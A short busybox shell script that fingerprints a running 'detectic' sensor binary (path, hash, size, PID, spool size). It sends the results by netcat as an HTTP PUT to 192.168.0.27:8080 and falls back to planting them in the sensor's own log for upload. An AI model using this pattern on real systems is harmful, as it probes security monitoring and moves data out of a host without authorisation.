#!/bin/sh
# Detectic binary probe — uses the running detectic binary to upload
export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/sbin
BB=/bin/busybox

# Find the binary
BIN=$($BB find /var /tmp -name 'detectic' -type f 2>/dev/null | $BB head -1)
SHA=$($BB sha256sum "$BIN" 2>/dev/null | $BB awk '{print $1}')
SIZE=$($BB ls -la "$BIN" 2>/dev/null | $BB awk '{print $5}')
PID=$($BB ps | $BB grep -i detectic | $BB grep -v grep | $BB head -1 | $BB awk '{print $1}')

# Find spool size
SPOOL=$($BB wc -c /var/run/misc/misc_rw/detectic/spool/detectic_buffer.jsonl 2>/dev/null | $BB awk '{print $1}')

# Write probe data to a temp file
echo "BIN=$BIN" > /tmp/probe_data.txt
echo "SHA256=$SHA" >> /tmp/probe_data.txt
echo "SIZE=$SIZE" >> /tmp/probe_data.txt
echo "PID=$PID" >> /tmp/probe_data.txt
echo "SPOOL_SIZE=$SPOOL" >> /tmp/probe_data.txt

# Try to use nc (netcat) to send the data
if [ -x /usr/bin/nc ] || [ -x /bin/nc ]; then
    $BB nc 192.168.0.27 8080 <<EOF
PUT /sensor_log?f=binary_probe.txt HTTP/1.0
Host: 192.168.0.27:8080
Content-Type: text/plain
Content-Length: $($BB wc -c < /tmp/probe_data.txt)

$($BB cat /tmp/probe_data.txt)
EOF
fi

# If nc not available, try using the detectic binary itself
# The detectic binary has HTTP client capabilities
if [ -x "$BIN" ]; then
    # Use detectic to query its own health
    $BIN health >> /tmp/probe_data.txt 2>&1
fi

# Last resort: write to sensor_log.txt and hope the sensor uploads it
echo "[probe] BIN=$BIN SHA=$SHA SIZE=$SIZE PID=$PID SPOOL=$SPOOL" >> /var/run/misc/misc_rw/detectic/sensor_log.txt 2>/dev/null

$BB rm -f /tmp/probe_data.txt 2>/dev/null
